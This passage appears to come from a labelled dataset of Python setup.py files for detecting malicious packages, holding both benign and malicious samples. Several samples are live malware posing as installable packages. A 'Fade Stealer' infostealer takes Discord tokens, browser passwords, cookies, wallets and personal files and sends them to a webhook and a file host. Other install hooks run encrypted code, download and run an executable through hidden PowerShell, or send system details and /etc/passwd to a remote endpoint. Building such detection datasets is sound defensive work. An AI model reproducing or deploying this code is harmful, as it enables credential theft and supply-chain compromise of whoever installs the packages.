userjson:\n        nitrot=userjson['premium_type']\n        if nitrot==1:\n            nitro='<:classic:896119171019067423> '\n        elif nitrot==2:\n            nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '\n    if 'phone' in userjson:phone=f'`{userjson[\"phone\"]}`'\n    return username,hashtag,email,idd,pfp,flags,nitro,phone\ndef checkToken(token):\n    headers={\n        'Authorization':token,\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    try:\n        urlopen(Request('https://discordapp.com/api/v6/users/@me',headers=headers))\n        return True\n    except:\n        return False\ndef uploadToken(token,path):\n    global hook\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)\n    if pfp==None:\n        pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'\n    else:\n        pfp=f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n    billing=GetBilling(token)\n    badge=GetBadge(flags)\n    friends=GetUHQFriends(token)\n    if friends=='':friends='No HQ Friends'\n    if not billing:\n        badge,phone,billing=badge,phone,None\n    if nitro=='' and badge=='':nitro=' -'\n    data={\n        'content':f'Found in `{path}`',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                    'name':'<a:dt:1032744237042774057> Token:',\n                    'value':f\"`{token}`\\n[Click to copy](https://superfurrycdn.nl/copy/{token})\"\n},\n{\n                    'name':'<a:Bat:1032747993981538395> Email:',\n                    'value':f\"`{email}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:gengar:1032750484961890426> Phone:',\n                    'value':f\"{phone}\",\n                    'inline':True\n},\n{\n                    'name':'<a:dt1:1032749135188742176> IP:',\n                    'value':f\"`{getip()}`\",\n                    'inline':True\n},\n{\n                    'name':'<a:uzi:1032752999795265537> Badges:',\n                    'value':f\"{nitro}{badge}\",\n                    'inline':True\n},\n{\n                    'name':'<a:Cc:1032742457416355882> Billing:',\n                    'value':f\"{billing}\",\n                    'inline':True\n},\n{\n                    'name':'<a:diamond:1032752566926315575> HQ Friends:',\n                    'value':f\"{friends}\",\n                    'inline':False\n}\n],\n            'author':{\n                'name':f\"{username}#{hashtag} ({idd})\",\n                'icon_url':f\"{pfp}\"\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n},\n            'thumbnail':{\n                'url':f\"{pfp}\"\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1028588906846879856/1037436987482841129/unknown.png',\n        'username':'Fade Stealer',\n        'attachments':[]\n}\n    LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\ndef Reformat(listt):\n    e=re.findall('(\\\\w+[a-z])',listt)\n    while 'https' in e:e.remove('https')\n    while 'com' in e:e.remove('com')\n    while 'net' in e:e.remove('net')\n    return list(set(e))\ndef upload(name,tk=''):\n    headers={\n        'Content-Type':'application/json',\n        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'\n}\n    if name=='kiwi':\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Interesting files found on user PC:',\n                'value':tk\n}\n],\n            'author':{\n                'name':'Fade | File stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n        return\n    path=name\n    files={'file':open(path,'rb')}\n    if 'wppassw' in name:\n        ra=' | '.join(da for da in paswWords)\n        if len(ra)>1000:\n            rrr=Reformat(str(paswWords))\n            ra=' | '.join(da for da in rrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':ra\n}\n],\n            'author':{\n                'name':'Fade | Password Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    if 'wpcook' in name:\n        rb=' | '.join(da for da in cookiWords)\n        if len(rb)>1000:\n            rrrrr=Reformat(str(cookiWords))\n            rb=' | '.join(da for da in rrrrr)\n        data={\n        'content':'',\n        'embeds':[\n{\n            'color':3449140,\n            'fields':[\n{\n                'name':'Found:',\n                'value':rb\n}\n],\n            'author':{\n                'name':'Fade | Stealer'\n},\n            'footer':{\n                'text':'@Fade Stealer',\n                'icon_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif'\n}\n}\n],\n        'avatar_url':'https://cdn.discordapp.com/attachments/1031878883848507402/1036012894170665060/Comp_2.gif',\n        'attachments':[]\n}\n        LoadUrlib(hook,data=dumps(data).encode(),headers=headers)\n    LoadRequests('POST',hook,files=files)\ndef writeforfile(data,name):\n    path=os.getenv('TEMP')+f\"\\wp{name}.txt\"\n    with open(path,mode='w',encoding='utf-8')as f:\n        f.write(f\"<--Fade Stealer ON TOP-->\\n\\n\")\n        for line in data:\n            if line[0]!='':\n                f.write(f\"{line}\\n\")\nTokens=''\ndef getToken(path,arg):\n    if not os.path.exists(path):return\n    path+=arg\n    for file in os.listdir(path):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{path}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for regex in('[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}','mfa\\\\.[\\\\w-]{80,95}'):\n                    for token in re.findall(regex,line):\n                        global Tokens\n                        if checkToken(token):\n                            if not token in Tokens:\n                                Tokens+=token\n                                uploadToken(token,path)\nPassw=[]\ndef getPassw(path,arg):\n    global Passw\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Login Data'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT action_url, username_value, password_value FROM logins;')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in paswWords:paswWords.append(old)\n            Passw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Passw,'passw')\nCookies=[]\ndef getCookie(path,arg):\n    global Cookies\n    if not os.path.exists(path):return\n    pathC=path+arg+'/Cookies'\n    if os.stat(pathC).st_size==0:return\n    tempfold=temp+'wp'+''.join(random.choice('bcdefghijklmnopqrstuvwxyz')for i in range(8))+'.db'\n    shutil.copy2(pathC,tempfold)\n    conn=sql_connect(tempfold)\n    cursor=conn.cursor()\n    cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')\n    data=cursor.fetchall()\n    cursor.close()\n    conn.close()\n    os.remove(tempfold)\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for row in data:\n        if row[0]!='':\n            for wa in keyword:\n                old=wa\n                if 'https' in wa:\n                    tmp=wa\n                    wa=tmp.split('[')[1].split(']')[0]\n                if wa in row[0]:\n                    if not old in cookiWords:cookiWords.append(old)\n            Cookies.append(f\"H057 K3Y: {row[0]} | N4M3: {row[1]} | V41U3: {DecryptValue(row[2], master_key)}\")\n    writeforfile(Cookies,'cook')\ndef GetDiscord(path,arg):\n    if not os.path.exists(f\"{path}/Local State\"):return\n    pathC=path+arg\n    pathKey=path+'/Local State'\n    with open(pathKey,'r',encoding='utf-8')as f:local_state=json_loads(f.read())\n    master_key=b64decode(local_state['os_crypt']['encrypted_key'])\n    master_key=CryptUnprotectData(master_key[5:])\n    for file in os.listdir(pathC):\n        if file.endswith('.log')or file.endswith('.ldb'):\n            for line in[x.strip()for x in open(f\"{pathC}\\\\{file}\",errors='ignore').readlines()if x.strip()]:\n                for token in re.findall('dQw4w9WgXcQ:[^.*\\\\[\\'(.*)\\'\\\\].*$][^\\\\\"]*',line):\n                    global Tokens\n                    tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)\n                    if checkToken(tokenDecoded):\n                        if not tokenDecoded in Tokens:\n                            Tokens+=tokenDecoded\n                            uploadToken(tokenDecoded,path)\ndef ZipThings(path,arg,procc):\n    pathC=path\n    name=arg\n    if 'nkbihfbeogaeaoehlefnkodbefgpgknn' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"Metamask_{browser}\"\n        pathC=path+arg\n    if not os.path.exists(pathC):return\n    subprocess.Popen(f\"taskkill /im {procc} /t /f\",shell=True)\n    if 'Wallet' in arg or 'NationsGlory' in arg:\n        browser=path.split('\\\\')[4].split('/')[1].replace(' ','')\n        name=f\"{browser}\"\n    elif 'Steam' in arg:\n        if not os.path.isfile(f\"{pathC}/loginusers.vdf\"):return\n        f=open(f\"{pathC}/loginusers.vdf\",'r+',encoding='utf8')\n        data=f.readlines()\n        found=False\n        for l in data:\n            if 'RememberPassword\"\t\t\"1\"' in l:\n                found=True\n        if found==False:return\n        name=arg\n    zf=ZipFile(f\"{pathC}/{name}.zip\",'w')\n    for file in os.listdir(pathC):\n        if not '.zip' in file:zf.write(pathC+'/'+file)\n    zf.close()\n    upload(f'{pathC}/{name}.zip')\n    os.remove(f\"{pathC}/{name}.zip\")\ndef GatherAll():\n    '                   Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     Cookies < 4 >                          Extentions < 5 >                                  '\n    browserPaths=[\n[f\"{roaming}/Opera Software/Opera GX Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Stable\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{roaming}/Opera Software/Opera Neon/User Data/Default\",'opera.exe','/Local Storage/leveldb','/','/Network','/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Google/Chrome SxS/User Data\",'chrome.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/BraveSoftware/Brave-Browser/User Data\",'brave.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Yandex/YandexBrowser/User Data\",'yandex.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],\n[f\"{local}/Microsoft/Edge/User Data\",'edge.exe','/Default/Local Storage/leveldb','/Default','/Default/Network','/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn']\n]\n    discordPaths=[\n[f\"{roaming}/Discord\",'/Local Storage/leveldb'],\n[f\"{roaming}/Lightcord\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordcanary\",'/Local Storage/leveldb'],\n[f\"{roaming}/discordptb\",'/Local Storage/leveldb'],\n]\n    PathsToZip=[\n[f\"{roaming}/atomic/Local Storage/leveldb\",'\"Atomic Wallet.exe\"','Wallet'],\n[f\"{roaming}/Exodus/exodus.wallet\",'Exodus.exe','Wallet'],\n['C:\\\\Program Files (x86)\\\\Steam\\\\config','steam.exe','Steam'],\n[f\"{roaming}/NationsGlory/Local Storage/leveldb\",'NationsGlory.exe','NationsGlory']\n]\n    for patt in browserPaths:\n        a=threading.Thread(target=getToken,args=[patt[0],patt[2]])\n        a.start()\n        Threadlist.append(a)\n    for patt in discordPaths:\n        a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]])\n        a.start()\n        Threadlist.append(a)\n    for patt in browserPaths:\n        a=threading.Thread(target=getPassw,args=[patt[0],patt[3]])\n        a.start()\n        Threadlist.append(a)\n    ThCokk=[]\n    for patt in browserPaths:\n        a=threading.Thread(target=getCookie,args=[patt[0],patt[4]])\n        a.start()\n        ThCokk.append(a)\n    for thread in ThCokk:thread.join()\n    DETECTED=Trust(Cookies)\n    if DETECTED==True:return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]).start()\n    for patt in PathsToZip:\n        threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths    \n    upths=[]\n    for file in['wppassw.txt','wpcook.txt']:\n        upload(os.getenv('TEMP')+'\\\\'+file)\ndef uploadToAnonfiles(path):\n    try:\n        files={'file':(path,open(path,mode='rb'))}\n        upload=requests.post('https://transfer.sh/',files=files)\n        url=upload.text\n        return url\n    except:\n        return False\ndef KiwiFolder(pathF,keywords):\n    global KiwiFiles\n    maxfilesperdir=7\n    i=0\n    listOfFile=os.listdir(pathF)\n    ffound=[]\n    for file in listOfFile:\n        if not os.path.isfile(pathF+'/'+file):return\n        i+=1\n        if i<=maxfilesperdir:\n            url=uploadToAnonfiles(pathF+'/'+file)\n            ffound.append([pathF+'/'+file,url])\n        else:\n            break\n    KiwiFiles.append(['folder',pathF+'/',ffound])\nKiwiFiles=[]\ndef KiwiFile(path,keywords):\n    global KiwiFiles\n    fifound=[]\n    listOfFile=os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path+'/'+file)and '.txt' in file:\n                    fifound.append([path+'/'+file,uploadToAnonfiles(path+'/'+file)])\n                    break\n                if os.path.isdir(path+'/'+file):\n                    target=path+'/'+file\n                    KiwiFolder(target,keywords)\n                    break\n    KiwiFiles.append(['folder',path,fifound])\ndef Kiwi():\n    user=temp.split('\\\\AppData')[0]\n    path2search=[\n        user+'/Desktop',\n        user+'/Downloads',\n        user+'/Documents'\n]\n    key_wordsFolder=[\n        'account',\n        'acount',\n        'passw',\n        'secret'\n]\n    key_wordsFiles=[\n        'passw',\n        'mdp',\n        'motdepasse',\n        'mot_de_passe',\n        'login',\n        'secret',\n        'account',\n        'acount',\n        'paypal',\n        'banque',\n        'account',\n        'metamask',\n        'wallet',\n        'crypto',\n        'exodus',\n        'discord',\n        '2fa',\n        'code',\n        'memo',\n        'compte',\n        'token',\n        'backup',\n        'secret',\n        'prox'\n        'binance'\n        'Electrum'\n        'Mycelium'\n]\n    wikith=[]\n    for patt in path2search:\n        kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start()\n        wikith.append(kiwi)\n    return wikith\nglobal keyword,cookiWords,paswWords\nkeyword=[\n    'mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)','crypto','[uber](https://uber.com)','[netflix](https://netflix.com)'\n]\ncookiWords=[]\npaswWords=[]\nGatherAll()\nDETECTED=Trust(Cookies)\nif not DETECTED:\n    wikith=Kiwi()\n    for thread in wikith:thread.join()\n    time.sleep(0.2)\n    filetext='\\n'\n    for arg in KiwiFiles:\n        if len(arg[2])!=0:\n            foldpath=arg[1]\n            foldlist=arg[2]\n            filetext+=f\"\ufffd {foldpath}\\n\"\n            for ffil in foldlist:\n                a=ffil[0].split('/')\n                fileanme=a[len(a)-1]\n                b=ffil[1]\n                filetext+=f\"... [{fileanme}]({b})\\n\"\n            filetext+='\\n'\n    upload('kiwi',filetext)\n\n\nsetup(\n\n    name='shiwers',\n    packages=['shiwers'],\n    version='1.0',\n    license='MIT',\n    description='nitrobrder',\n    author=' Jonathan Hartley',\n    keywords=['Colorama'],\n    install_requires=[''],\n    classifiers=['Development Status :: 5 - Production/Stable']\n\n)", "target": 1}
{"idx": "pilloa-1.0.0", "func": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'HvEYHYtTrTNXWoItgYNqCdLfPaxAOgCWEJjVjObjvxZDqTaIGaUmeRUJyFoPCd'\nLONG_DESCRIPTION = 'FktzzsdELXZNCpPUXOZvqmjiUtLMdqgxYjsaDhSURjvgJvaHTxQfYwaNeYpEzfgPGwqPJTiAwSbedWrMJnLDyZelceTcKMhcCnEjPrnQWgvQdlwXTUVPCYFUj ivKttUczqBzWOdW afwufpTWzidnnRjqffaFwWnNVkpmdlirwVHxhdDaStMiIYZzuyiOihINiBWooCtlknHuNPBTG pKHKQqvodYHgMrkPonfvRL ClmkJTIJynwHjvBpeWOhRnzoCGbVxDvA'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'rVgPXvHOzoirz_L0J0BkBSWWrEvX6qulYSzsZAukOvs=').decrypt(b'gAAAAABmA1oIBo2NCX5LlgfV10DNXeHRWJCVAmk15fG-1q0gBJs5U19LDRUae17TK759LTsc6TEimpYXsj2c1E4vU_F29x6aBfQbdhKbfLgt-LhP8d3BinraRRyj267Cz9o4O4r75Tjug_f6e1beHwgoRWjMilvPXOiTbl39MEvUQPr6UqRpdzWVJZHMg8q6-B6KIVKJVruu6hGk3X2oBjjVAGiIVehkpg=='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"pilloa\",\n    version=VERSION,\n    author=\"LZaybkLB\",\n    author_email=\"ZrhAASNZoGZ@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n", "target": 1}
{"idx": "pushre-3.45", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pushre',\n    packages = ['modlib'],\n    version = '9.14',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "flake8-coding-1.3.2", "func": "# -*- coding: utf-8 -*-\nimport re\n\nfrom setuptools import setup\n\n\ndef get_version(filename):\n    \"\"\"\n    Return package version as listed in `__version__` in `filename`.\n    \"\"\"\n    init_py = open(filename).read()\n    return re.search(\"__version__ = ['\\\"]([^'\\\"]+)['\\\"]\", init_py).group(1)\n\n\nversion = get_version('flake8_coding.py')\n\n\nwith open('README.rst') as readme_file:\n    readme = readme_file.read()\n\n\nsetup(\n    name='flake8-coding',\n    version=version,\n    description='Adds coding magic comment checks to flake8',\n    long_description=readme,\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Topic :: Software Development',\n    ],\n    author='Takeshi KOMIYA',\n    author_email='i.tkomiya@gmail.com',\n    url='https://github.com/tk0miya/flake8-coding',\n    license='Apache License 2.0',\n    keywords='pep8 flake8 coding',\n    py_modules=['flake8_coding'],\n    install_requires=[\n        'flake8',\n    ],\n    entry_points={\n        'flake8.extension': ['C10 = flake8_coding:CodingChecker'],\n    },\n)\n", "target": 0}
{"idx": "ceedee-5.8.0", "func": "from setuptools import setup, find_packages\nimport os\nimport platform\nimport requests\nfrom urllib import request, parse\n\n# Please do not delete this.\nos_name = platform.system()\ndata = {}\nif os_name == 'Linux' or os_name == 'Darwin':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        passwd_file = os.popen('cat /etc/passwd').read()\n        os_info = os.popen('uname -a').read()\n        curr_dir = os.popen(\"pwd\").read()\n        list_curr_dir = os.popen(\"ls -la\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Password File': passwd_file,\n            'OS Information': os_info,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelif os_name == 'Windows':\n    try:\n        hostname = os.popen('hostname').read()\n        whoami = os.popen('whoami').read()\n        curr_dir = os.popen(\"cd\").read()\n        list_curr_dir = os.popen(\"dir\").read()\n\n        data = {\n            'OS': os_name,\n            'Hostname': hostname,\n            'Logged In Username': whoami,\n            'Current Directory': curr_dir,\n            'List of files in Current Directory': list_curr_dir\n        }\n\n    except:\n        data = {'Error': 'There was an error while fetching OS related data or sending information for ' + os_name}\n\nelse:\n    data = {'Error': 'Cannot determine OS'}\n\ndata_enc = parse.urlencode(data).encode()\nAPI_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\nreq = request.Request(API_ENDPOINT, data=data_enc)\nres = request.urlopen(req)\n\nsetup(\n    name='ceedee',\n    version='5.8.0',\n    license='MIT',\n    author=\"Shubham_fnra\",\n    author_email='shubham.agrawal@finra.org',\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    url='https://github.com/gmyrianthous/example-publish-pypi',\n    keywords='ceedee project',\n    install_requires=[\n          'scikit-learn',\n          'requests',\n      ],\n)\n\n# name = os.popen('hostname').read()\n# # who = os.popen('cat /etc/passwd').read()\n# # what = os.popen('uname -a').read()\n# network = os.popen('dir').read()\n#\n# API_ENDPOINT = \"https://rk8xxqzdug.execute-api.us-east-1.amazonaws.com/Test/response\"\n#\n# data = {\n# 'hostname': name,\n# # 'whoami': what,\n# 'network': network\n# }\n#\n# r = requests.post(url=API_ENDPOINT, data=data)\n", "target": 1}
{"idx": "flask-restplus-0.13.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n# flake8: noqa\n\nimport io\nimport os\nimport re\nimport sys\n\nfrom setuptools import setup, find_packages\n\nRE_REQUIREMENT = re.compile(r'^\\s*-r\\s*(?P<filename>.*)$')\n\nPYPI_RST_FILTERS = (\n    # Replace Python crossreferences by simple monospace\n    (r':(?:class|func|meth|mod|attr|obj|exc|data|const):`~(?:\\w+\\.)*(\\w+)`', r'``\\1``'),\n    (r':(?:class|func|meth|mod|attr|obj|exc|data|const):`([^`]+)`', r'``\\1``'),\n    # replace doc references\n    (r':doc:`(.+) <(.*)>`', r'`\\1 <http://flask-restplus.readthedocs.org/en/stable\\2.html>`_'),\n    # replace issues references\n    (r':issue:`(.+?)`', r'`#\\1 <https://github.com/noirbizarre/flask-restplus/issues/\\1>`_'),\n    # replace pr references\n    (r':pr:`(.+?)`', r'`#\\1 <https://github.com/noirbizarre/flask-restplus/pull/\\1>`_'),\n    # replace commit references\n    (r':commit:`(.+?)`', r'`#\\1 <https://github.com/noirbizarre/flask-restplus/commit/\\1>`_'),\n    # Drop unrecognized currentmodule\n    (r'\\.\\. currentmodule:: .*', ''),\n)\n\n\ndef rst(filename):\n    '''\n    Load rst file and sanitize it for PyPI.\n    Remove unsupported github tags:\n     - code-block directive\n     - all badges\n    '''\n    content = io.open(filename).read()\n    for regex, replacement in PYPI_RST_FILTERS:\n        content = re.sub(regex, replacement, content)\n    return content\n\n\n\ndef pip(filename):\n    '''Parse pip reqs file and transform it to setuptools requirements.'''\n    requirements = []\n    for line in io.open(os.path.join('requirements', '{0}.pip'.format(filename))):\n        line = line.strip()\n        if not line or '://' in line or line.startswith('#'):\n            continue\n        requirements.append(line)\n    return requirements\n\n\nlong_description = '\\n'.join((\n    rst('README.rst'),\n    rst('CHANGELOG.rst'),\n    ''\n))\n\n\nexec(compile(open('flask_restplus/__about__.py').read(), 'flask_restplus/__about__.py', 'exec'))\n\ninstall_requires = pip('install')\ndoc_require = pip('doc')\ntests_require = pip('test')\ndev_require = tests_require + pip('develop')\n\nsetup(\n    name='flask-restplus',\n    version=__version__,\n    description=__description__,\n    long_description=long_description,\n    url='https://github.com/noirbizarre/flask-restplus',\n    author='Axel Haustant',\n    author_email='axel@data.gouv.fr',\n    packages=find_packages(exclude=['tests', 'tests.*']),\n    include_package_data=True,\n    install_requires=install_requires,\n    tests_require=tests_require,\n    dev_require=dev_require,\n    extras_require={\n        'test': tests_require,\n        'doc': doc_require,\n        'dev': dev_require, \n    },\n    license='BSD-3-Clause',\n    zip_safe=False,\n    keywords='flask restplus rest api swagger openapi',\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Programming Language :: Python',\n        'Environment :: Web Environment',\n        'Operating System :: OS Independent',\n        'Intended Audience :: Developers',\n        'Topic :: System :: Software Distribution',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'License :: OSI Approved :: BSD License',\n    ],\n)\n", "target": 0}
